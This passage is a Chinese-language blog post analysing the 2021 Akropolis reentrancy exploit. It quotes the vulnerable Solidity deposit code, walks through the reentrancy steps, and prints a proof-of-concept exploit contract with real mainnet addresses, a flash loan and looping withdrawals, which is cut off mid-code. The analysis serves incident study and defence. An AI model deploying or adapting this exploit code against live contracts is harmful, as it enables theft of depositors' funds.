@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>akropolis攻击事件-重入攻击 | SCS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="复盘分析、闪电贷、重入、" />
+  
+  
+  
+  
+  <meta name="description" content="Akropolis的交易模式Akropolis就是众多资产托管平台中的一个：普通用户将个人的数字资产投入到Akropolis中，由Akropolis确定投资方向，优化投资策略。Akropolis获得投资收益之后，将收益按比例分配给投资Akropolis的普通用户。以现实中的金融活动举例子，Akropolis就像是基金，其所投资的DeFi项目就是股票，基民购买基金，基金持有股票，获得收益后将收益分配">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Akropolis攻击事件-重入攻击">
+<meta property="og:url" content="http://example.com/2021/10/19/Akropolis%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="SCS">
+<meta property="og:description" content="Akropolis的交易模式Akropolis就是众多资产托管平台中的一个：普通用户将个人的数字资产投入到Akropolis中，由Akropolis确定投资方向，优化投资策略。Akropolis获得投资收益之后，将收益按比例分配给投资Akropolis的普通用户。以现实中的金融活动举例子，Akropolis就像是基金，其所投资的DeFi项目就是股票，基民购买基金，基金持有股票，获得收益后将收益分配">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2021/10/19/Akropolis%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/v2-ae1bd45e3887887597a5252f0bab418e_r.jpg">
+<meta property="og:image" content="http://example.com/2021/10/19/Akropolis%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/Snipaste_2021-10-19_17-12-24.png">
+<meta property="article:published_time" content="2021-10-19T02:42:40.000Z">
+<meta property="article:modified_time" content="2021-10-19T09:59:18.900Z">
+<meta property="article:author" content="Janson Woods">
+<meta property="article:tag" content="复盘分析、闪电贷、重入、">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/19/Akropolis%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/v2-ae1bd45e3887887597a5252f0bab418e_r.jpg">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Akropolis攻击事件-重入攻击" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Akropolis攻击事件-重入攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2021/10/19/Akropolis%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/" class="article-date">
+	  <time datetime="2021-10-19T02:42:40.000Z" itemprop="datePublished">2021-10-19</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Akropolis的交易模式"><a href="#Akropolis的交易模式" class="headerlink" title="Akropolis的交易模式"></a>Akropolis的交易模式</h3><p>Akropolis就是众多资产托管平台中的一个：普通用户将个人的数字资产投入到Akropolis中，由Akropolis确定投资方向，优化投资策略。Akropolis获得投资收益之后，将收益按比例分配给投资Akropolis的普通用户。以现实中的金融活动举例子，Akropolis就像是基金，其所投资的DeFi项目就是股票，基民购买基金，基金持有股票，获得收益后将收益分配给基民。</p>
+<p>用户通过savingsModule.deposit函数将手中的token投资到<code>Protocol</code>中，获得<code>Protocol</code>的份额（份额代币LP），等到将来<code>Protocol</code>中的资产升值了，那么用户便可以从<code>Protocol</code>获取到一定的收益。</p>
+<p>savingsModule.deposit函数源码（<a target="_blank" rel="noopener" href="https://github.com/akropolisio/delphi/blob/release-1.0/contracts/modules/savings/SavingsModule.sol#L217-L277%EF%BC%89">https://github.com/akropolisio/delphi/blob/release-1.0/contracts/modules/savings/SavingsModule.sol#L217-L277）</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @notice Deposit tokens to a protocol</span><br><span class="line"> * @param _protocol Protocol to deposit tokens</span><br><span class="line"> * @param _tokens Array of tokens to deposit</span><br><span class="line"> * @param _dnAmounts Array of amounts (denormalized to token decimals)</span><br><span class="line"> */</span><br><span class="line">function deposit(address _protocol, address[] memory _tokens, uint256[] memory _dnAmounts)</span><br><span class="line">public operationAllowed(IAccessModule.Operation.Deposit)</span><br><span class="line">returns(uint256) </span><br><span class="line">&#123;</span><br><span class="line">    //distributeRewardIfRequired(_protocol);</span><br><span class="line"></span><br><span class="line">    uint256 nAmount;</span><br><span class="line">    for (uint256 i=0; i &lt; _tokens.length; i++) &#123;</span><br><span class="line">        nAmount = nAmount.add(normalizeTokenAmount(_tokens[i], _dnAmounts[i]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 nBalanceBefore = distributeYieldInternal(_protocol);  //获取deposit之前Protocol的余额，before-deposit</span><br><span class="line">    depositToProtocol(_protocol, _tokens, _dnAmounts);       //将对应token存入Protocol的池子，调用_tokens的transferFrom函数转账 </span><br><span class="line">    uint256 nBalanceAfter = updateProtocolBalance(_protocol);  //获取deposit之后Protocol的余额，after-deposit</span><br><span class="line"></span><br><span class="line">    PoolToken poolToken = PoolToken(protocols[_protocol].poolToken);</span><br><span class="line">    uint256 nDeposit = nBalanceAfter.sub(nBalanceBefore);</span><br><span class="line"></span><br><span class="line">    uint256 cap;</span><br><span class="line">    if(userCapEnabled) &#123;</span><br><span class="line">        cap = userCap(_protocol, _msgSender());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 fee;</span><br><span class="line">    if(nAmount &gt; nDeposit) &#123;</span><br><span class="line">        fee = nAmount - nDeposit;</span><br><span class="line">        poolToken.mint(_msgSender(), nDeposit);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        fee = 0;</span><br><span class="line">        poolToken.mint(_msgSender(), nAmount);</span><br><span class="line">        uint256 yield = nDeposit - nAmount;</span><br><span class="line">        if (yield &gt; 0) &#123;</span><br><span class="line">            //Additional Yield received from protocol (because of lottery, or something)</span><br><span class="line">            createYieldDistribution(poolToken, yield);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(protocolCapEnabled) &#123;</span><br><span class="line">        if( !(vipUserEnabled &amp;&amp; protocols[_protocol].isVipUser[_msgSender()]) ) &#123;</span><br><span class="line">            uint256 ptTS = poolToken.totalSupply();</span><br><span class="line">            require(ptTS &lt;= protocolCap[_protocol], &quot;SavingsModule: deposit exeeds protocols cap&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(userCapEnabled) &#123;</span><br><span class="line">        //uint256 actualAmount = nAmount.sub(fee); //Had to remove this because of stack too deep err</span><br><span class="line">        require(cap &gt;= nAmount.sub(fee), &quot;SavingsModule: deposit exeeds user cap&quot;);</span><br><span class="line">        // cap = cap - nAmount.sub(fee);</span><br><span class="line">        //protocols[_protocol].userCap[_msgSender()] = cap;</span><br><span class="line">        // emit UserCapChanged(_protocol, _msgSender(), cap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Deposit(_protocol, _msgSender(), nAmount, fee);</span><br><span class="line">    return nDeposit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function depositToProtocol(address _protocol, address[] memory _tokens, uint256[] memory _dnAmounts) internal &#123;</span><br><span class="line">    require(_tokens.length == _dnAmounts.length, &quot;SavingsModule: count of tokens does not match count of amounts&quot;);</span><br><span class="line">    for (uint256 i=0; i &lt; _tokens.length; i++) &#123;</span><br><span class="line">        address tkn = _tokens[i];</span><br><span class="line">        IERC20(tkn).safeTransferFrom(_msgSender(), _protocol, _dnAmounts[i]);//调用tkn的safeTransferFrom函数</span><br><span class="line">        IDefiProtocol(_protocol).handleDeposit(tkn, _dnAmounts[i]);</span><br><span class="line">        emit DepositToken(_protocol, tkn, _dnAmounts[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//fakecoin的transferFrom　函数会重入deposit函数</span><br><span class="line">function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">    console.log(&quot;transferFrom&quot;);</span><br><span class="line">    emit ReEntered(dyPoolBalance);</span><br><span class="line">    address[] memory tokensIn = new address[](1);</span><br><span class="line">    tokensIn[0] = address(dai);</span><br><span class="line">    uint[] memory amountsIn = new uint[](1);</span><br><span class="line">    amountsIn[0] = deposit;</span><br><span class="line">    nDepositDai = savingsModule.deposit(curveYPool, tokensIn, amountsIn);</span><br><span class="line">    console.log(&quot;nDepositDai    :&quot;, nDepositDai);   </span><br><span class="line"></span><br><span class="line">    dyPoolBalance = dyPool.balanceOf(address(this));</span><br><span class="line">    console.log(&quot;dyPoolBalance DAI:     &quot;, dyPoolBalance);   </span><br><span class="line">    emit DyPoolBalance(1, dyPoolBalance);</span><br><span class="line"></span><br><span class="line">    return dai.transferFrom(address(this), curveYPool, 1*10**18);</span><br><span class="line">    //return true;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h3 id="本次攻击的漏洞原因为：deposit并未对存入的代币进行校验，使得可以将任何代币打入protocol中，同时并没有进行防重入的检查，导致出现的二次重入攻击。"><a href="#本次攻击的漏洞原因为：deposit并未对存入的代币进行校验，使得可以将任何代币打入protocol中，同时并没有进行防重入的检查，导致出现的二次重入攻击。" class="headerlink" title="本次攻击的漏洞原因为：deposit并未对存入的代币进行校验，使得可以将任何代币打入protocol中，同时并没有进行防重入的检查，导致出现的二次重入攻击。"></a>本次攻击的漏洞原因为：deposit并未对存入的代币进行校验，使得可以将任何代币打入protocol中，同时并没有进行防重入的检查，导致出现的二次重入攻击。</h3><h4 id="攻击简述："><a href="#攻击简述：" class="headerlink" title="攻击简述："></a>攻击简述：</h4><h6 id="0xe1f375a47172b5612d96496a4599247049f07c9a7d518929fbe296b0c281e04d"><a href="#0xe1f375a47172b5612d96496a4599247049f07c9a7d518929fbe296b0c281e04d" class="headerlink" title="0xe1f375a47172b5612d96496a4599247049f07c9a7d518929fbe296b0c281e04d"></a>0xe1f375a47172b5612d96496a4599247049f07c9a7d518929fbe296b0c281e04d</h6><p>1.攻击者将将自己的空气币fakecoin通过deposit存入，首先进行余额检查获得<strong>before-deposit1</strong>；<em>（假定为０）</em></p>
+<p>2.合约执行depositToProtocol(_protocol, _tokens, _dnAmounts)语句，fakecoin的TransferFrom函数；</p>
+<p>​    2.1 fakecoin的TransferFrom函数将5000000个fakecoin打入Protocol中，并再一次进行deposit函数，获得第二次deposit的<strong>before-deposit2</strong>；*（０）fakecoin并不属于交易池中的代币，没有价值，所以依然是０.</p>
+<p>​    2.2 在第二次的deposit中，调用DAI的TransferFrom将闪电贷来的2474个DAI存入protocol中；</p>
+<p>​    2.3 后面对第二次的deposit的余额检查获得<strong>after-deposit2</strong>；<em>（2474个DAI）</em></p>
+<p>​    2.4 根据公式 <strong>after-before</strong> 获得本次存入DAI的数量L1<em>（2474）</em>，并向攻击者铸造L1数量的LP token；</p>
+<p>3，第二次deposit执行结束后回到第一次的deposit的执行环境中，相当于执行完第一次的TransferFrom函数，继续执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256 nBalanceAfter = updateProtocolBalance(_protocol);</span><br></pre></td></tr></table></figure>
+
+<p> 获得第一次deposit的<strong>after-deposit1</strong>（2474个DAI，同时也是第二次ｄｅｐｏｓｉｔ的after-deposit2）；</p>
+<p>４.根据公式 <strong>after-deposit1  -  before-deposit1</strong>（2474-0）得到第一次deposit获得的LP token数量L2（2474）。</p>
+<p>５.攻击者使用withdraw提取操作将4900左右个LP换成DAI，并将其转走。</p>
+<p><img src="/2021/10/19/Akropolis%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/v2-ae1bd45e3887887597a5252f0bab418e_r.jpg" alt="v2-ae1bd45e3887887597a5252f0bab418e_r"></p>
+<h3 id="攻击者通过这其中的一次操作利用闪电贷来的2474个DAI作为投入，获得４９００个DAI。重复多次，共攫取2-000-000美元的数字货币资产！"><a href="#攻击者通过这其中的一次操作利用闪电贷来的2474个DAI作为投入，获得４９００个DAI。重复多次，共攫取2-000-000美元的数字货币资产！" class="headerlink" title="攻击者通过这其中的一次操作利用闪电贷来的2474个DAI作为投入，获得４９００个DAI。重复多次，共攫取2,000,000美元的数字货币资产！"></a>攻击者通过这其中的一次操作利用闪电贷来的2474个DAI作为投入，获得４９００个DAI。重复多次，共攫取2,000,000美元的数字货币资产！</h3><h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;./ISavingsModule.sol&quot;;</span><br><span class="line">import &quot;./IUniswapV2Pair.sol&quot;;</span><br><span class="line">import &quot;./ICurveFiProtocol_Y.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Exploit2 is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">// break down the tx from: https://oko.palkeo.com/0xe2307837524Db8961C4541f943598654240bd62f/calls_from/</span><br><span class="line"></span><br><span class="line">// 1. calls savingsModule.poolTokenByProtocol </span><br><span class="line">// 2. calls balanceOf on dyPoolToken (why, maybe this is a loop?)</span><br><span class="line">// 3. approves spending of contract&#x27;s DAI by savingsModule</span><br><span class="line">// 4. checks balance of DAI</span><br><span class="line">// 5. calls savingsModule.deposit sending 5000000 of address(this)</span><br><span class="line">// 6. re-entered into address(this).transferFrom, calls  savingsModule.deposit sending 24747400163735396272620 dai</span><br><span class="line">// 7. now they transfer 1 dai, 1*10**18, to curveYPool</span><br><span class="line">// 8. call savingsModule.normalizedBalance</span><br><span class="line">// 9. calls balanceOf on dyPoolToken</span><br><span class="line">// 10. calls savingsModule.withdraw for</span><br><span class="line">//     - dnAmount: 49268.189080 × 10¹⁸ </span><br><span class="line">//     - _protocol: curveYPool</span><br><span class="line">//     - token: DAI</span><br><span class="line">//     - maxNAmount: 0</span><br><span class="line">// 11. goto line 5 for one more loop.</span><br><span class="line">// 12. approve 0.</span><br><span class="line"></span><br><span class="line">    // Pair of akro contracts/tokens:</span><br><span class="line">    address curveYPool = 0x7967adA2A32A633d5C055e2e075A83023B632B4e;</span><br><span class="line">    address dyPoolToken = 0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077;</span><br><span class="line">    // AKRO contract</span><br><span class="line">    ISavingsModule savingsModule = ISavingsModule(0x73fC3038B4cD8FfD07482b92a52Ea806505e5748);</span><br><span class="line">    // DAI/WETH pair for flashloan</span><br><span class="line">    IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);</span><br><span class="line">    ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); </span><br><span class="line">    ERC20 dyPool = ERC20(0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077); </span><br><span class="line">    ICurveFiProtocol_Y AkroYPool = ICurveFiProtocol_Y(curveYPool); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    uint borrow = 25000*10**18; </span><br><span class="line">    uint deposit = 24000*10**18; // akro had a deposit cap per user I think it was 25,000.</span><br><span class="line">    uint repay = (borrow * 100301) / 100000;</span><br><span class="line">    uint dyPoolBalance;</span><br><span class="line">    uint daiBalance;</span><br><span class="line">    uint thisSupply = 500000;</span><br><span class="line">    uint nDepositFake;</span><br><span class="line">    uint nDepositDai;</span><br><span class="line">    uint nBalance;</span><br><span class="line">    uint loops;</span><br><span class="line"></span><br><span class="line">    event DyPoolBalance(uint indexed state, uint indexed dyBalance);</span><br><span class="line">    event ReEntered(uint indexed dyPoolBalance);</span><br><span class="line"></span><br><span class="line">    // state 0: start, should be 0</span><br><span class="line">    // state 1: first, should be &lt; 25000000000000000000000</span><br><span class="line">    // state 2: second, should be &gt; 45000000000000000000000</span><br><span class="line">    // state 3: last, should be less than 24000000000000000000000</span><br><span class="line">    constructor() payable ERC20(&quot;Exploit&quot;, &quot;XPLT&quot;) &#123;</span><br><span class="line">        // doing all the approvals here:</span><br><span class="line">        // approve the akro contract to transfer our DAI </span><br><span class="line">        dai.approve(address(savingsModule), uint(-1));</span><br><span class="line">        // need to approve the akro contract to transfer our akro pool tokens</span><br><span class="line">        dyPool.approve(address(savingsModule), uint(-1));</span><br><span class="line">        balanceCheck(&quot;Deploy&quot;);</span><br><span class="line">        address poolToken = savingsModule.poolTokenByProtocol(curveYPool);</span><br><span class="line">        console.log(&quot;poolToken: &quot;, poolToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // call this to start the exploit</span><br><span class="line">    function run(uint _loops) external &#123;</span><br><span class="line">        loops = _loops;</span><br><span class="line">        console.log(&quot;RUN&quot;);</span><br><span class="line">        // take out a dai loan:</span><br><span class="line">        pair.swap(borrow, 0, address(this), &quot;0x&quot;);</span><br><span class="line">        // ^^ will call uniswapV2Call</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function uniswapV2Call(address,uint,uint,bytes calldata) external &#123;</span><br><span class="line">        balanceCheck(&quot;SWAP&quot;);</span><br><span class="line">        </span><br><span class="line">        dyPoolBalance = dyPool.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;dyPoolBalance:     &quot;, dyPoolBalance);   </span><br><span class="line">        emit DyPoolBalance(0, dyPoolBalance);</span><br><span class="line">        </span><br><span class="line">        // prep savingsModule deposit</span><br><span class="line">        uint[] memory amountsIn = new uint[](1);</span><br><span class="line">        amountsIn[0] = thisSupply;</span><br><span class="line">        address[] memory tokensIn = new address[](1);</span><br><span class="line">        tokensIn[0] = address(this);        </span><br><span class="line">        nDepositFake = savingsModule.deposit(curveYPool, tokensIn, amountsIn);</span><br><span class="line">        console.log(&quot;nDepositFake: &quot;, nDepositFake); </span><br><span class="line">        console.log(&quot;dyPoolBalance:     &quot;, dyPoolBalance);   </span><br><span class="line">       </span><br><span class="line">        console.log(&quot;back to uniswapV2Call&quot;);</span><br><span class="line"></span><br><span class="line">        // below this we have returned from the malicious transfer from.</span><br><span class="line">        nBalance = AkroYPool.normalizedBalance();</span><br><span class="line">        dyPoolBalance = dyPool.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;dyPoolBalance:     &quot;, dyPoolBalance);</span><br><span class="line">        emit DyPoolBalance(2, dyPoolBalance);</span><br><span class="line">        savingsModule.withdraw(curveYPool, address(dai), dyPoolBalance*99/100, 0);</span><br><span class="line">        console.log(&quot;withdraw:   &quot;,dyPoolBalance*99/100); </span><br><span class="line">        balanceCheck(&quot;BACK FROM HACK&quot;);</span><br><span class="line">        dyPoolBalance = dyPool.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;dyPoolBalance left over:     &quot;, dyPoolBalance);  </span><br><span class="line">        emit DyPoolBalance(3, dyPoolBalance);</span><br><span class="line"></span><br><span class="line">        for(uint i = 0;i &lt; loops; i++)&#123;</span><br><span class="line">            savingsModule.deposit(curveYPool, tokensIn, amountsIn);</span><br><span class="line">            dyPoolBalance = dyPool.balanceOf(address(this));</span><br><span class="line">            savingsModule.withdraw(curveYPool, address(dai), dyPoolBalance*99/100, 0);        </span><br><span class="line">            console.log(&quot;withdraw:   &quot;,dyPoolBalance*99/100);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bool daiSuccess = dai.transfer(address(pair), repay);</span><br><span class="line">        balanceCheck(&quot;PROFIT&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    // 